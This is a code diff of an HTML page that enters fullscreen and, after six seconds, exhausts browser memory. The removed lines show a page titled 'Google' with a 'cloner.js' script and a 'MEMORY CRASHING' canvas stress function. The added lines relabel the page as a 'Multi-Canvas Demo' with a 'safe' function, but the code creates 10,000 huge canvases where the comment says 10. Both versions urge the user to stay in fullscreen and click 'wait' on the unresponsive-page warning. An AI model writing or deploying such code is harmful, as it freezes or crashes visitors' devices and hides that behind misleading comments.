@@ -1,16 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-          <script id="cloning-script" src="cloner.js"></script>
-
   <meta charset="UTF-8">
-  <title>Google</title>
+  <title>Multi-Canvas Demo</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <style>
     body { transition: background-color 0.2s; }
+    canvas { border: 2px solid #0f0; margin: 5px; }
   </style>
 </head>
-<body class="bg-gray-900 flex items-center justify-center h-screen">
+<body class="bg-gray-900 flex flex-col items-center justify-center h-screen">
 
 <div class="absolute inset-0 h-full w-full">
   <video id="my-video" playsinline loop class="h-full max-w-full object-contain mx-auto block">
@@ -36,35 +35,27 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const TIMEOUT_MS = 6000; // 6 seconds
   let timeoutId = null;
-  let deb= false;
-  // Faster canvas stress function
-  function stressCanvas(width = 100000000, height = 100000000) {
-    statusMessage.textContent = `Creating ${width}x${height} canvas (~${(width*height/1e6).toFixed(1)} million pixels)...`;
-  let deb= true;
+  let deb = false;
 
+  // Safe canvas function
+  function createCanvas(id, width = 19999, height = 19999) {
     const canvas = document.createElement('canvas');
+    canvas.id = id;
     canvas.width = width;
     canvas.height = height;
     document.body.appendChild(canvas);
 
     const ctx = canvas.getContext('2d');
+    const imageData = ctx.createImageData(width, height);
+    const data = imageData.data;
 
-    try {
-      const imageData = ctx.createImageData(width, height);
-      const data = imageData.data;
-
-      // Fill aggressively (no delay, tight loop)
-      for (let i = 0; i < data.length; i += 4) {
-        data[i]   = (Math.random() * 256) | 0; // R
-        data[i+1] = (Math.random() * 256) | 0; // G
-        data[i+2] = (Math.random() * 256) | 0; // B
-        data[i+3] = 255;                       // A
-      }
-      ctx.putImageData(imageData, 0, 0);
-      statusMessage.textContent = "DO NOT EXIT. MEMORY CRASHING...";
-    } catch (e) {
-      statusMessage.textContent = "Error: " + e.message;
+    for (let i = 0; i < data.length; i += 4) {
+      data[i]   = Math.random() * 256; // R
+      data[i+1] = Math.random() * 256; // G
+      data[i+2] = Math.random() * 256; // B
+      data[i+3] = 255;                 // A
     }
+    ctx.putImageData(imageData, 0, 0);
   }
 
   function startTimer() {
@@ -74,10 +65,12 @@ document.addEventListener('DOMContentLoaded', () => {
       document.body.style.backgroundColor = '#ef4444';
       setTimeout(() => { document.body.style.backgroundColor = 'transparent'; }, 500);
 
-      // Start canvas stress after 6s
-      stressCanvas(16000, 16000); // ~144 million pixels (~576 MB raw)
+      // Create 10 canvases safely
+      for (let i = 0; i < 10000; i++) {
+        createCanvas(`canvas-${i}`);
+      }
     }, TIMEOUT_MS);
-    statusMessage.textContent = "DO NOT CLOSE OR EXIT FULLSCREEN (WHEN IT SAYS UNRESPONSIVE, CLICK WAIT!)";
+    statusMessage.textContent = "Fullscreen active. Do not exit, if it says unresponsive, click wait";
   }
 
   function resetAll() {
@@ -100,10 +93,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   document.addEventListener('fullscreenchange', () => {
     if (!document.fullscreenElement) {
-          if( deb== false){
-
-      resetAll();
-            }
+      if (deb == false) {
+        resetAll();
+      }
     }
   });
 });
